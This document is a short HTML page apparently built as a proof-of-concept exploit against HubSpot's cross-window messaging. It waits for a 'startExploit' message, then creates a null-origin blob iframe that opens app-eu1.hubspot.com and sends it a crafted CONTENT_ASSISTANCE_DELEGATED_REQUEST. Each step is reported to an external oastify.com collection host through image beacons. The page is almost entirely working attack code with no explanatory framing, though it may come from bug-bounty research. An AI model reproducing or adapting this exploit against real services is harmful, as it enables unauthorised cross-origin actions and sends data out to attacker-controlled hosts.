<!DOCTYPE html>
<html>
<head><title>Relay</title></head>
<body>
<h1>Relay</h1>
<div id="status"></div>
<script>
const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';

function log(msg) {
    document.getElementById('status').innerHTML += '<br>' + msg;
    new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
}

window.addEventListener('message', function(e) {
    if (e.data && e.data.action === 'startExploit') {
        log('TRIGGERED');
        
        // Create a blob URL with null origin
        const blob = new Blob([`
<script>
const E = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
function l(m) { new Image().src = E + '/?s=' + encodeURIComponent(m); }
l('START_origin=' + window.origin);
let h = window.open('https://app-eu1.hubspot.com', 'h', 'width=800,height=600');
if(h) {
    l('opened');
    let a = 0;
    setInterval(() => {
        try { h.origin; } 
        catch(e) {
            if(a++ === 0) {
                l('loaded');
                setTimeout(() => {
                    h.postMessage({type:'CONTENT_ASSISTANCE_DELEGATED_REQUEST',commandId:'x',featureId:'x',parameters:{},resultCount:1,language:'en',objectId:'46962361',applicationId:'x',basePath:'/',maxPollingAttempts:1,pollingInterval:100}, '*');
                    l('sent');
                }, 1000);
            }
        }
    }, 100);
}
<\/script>
        `], {type: 'text/html'});
        
        const blobUrl = URL.createObjectURL(blob);
        
        const iframe = document.createElement('iframe');
        iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox';
        iframe.src = blobUrl;
        iframe.style.cssText = 'width:100%;height:400px;border:3px solid red';
        document.body.appendChild(iframe);
        
        log('BLOB_IFRAME_ADDED');
    }
});

if(window.opener) window.opener.postMessage({status:'ready'},'*');
</script>
</body>
</html>
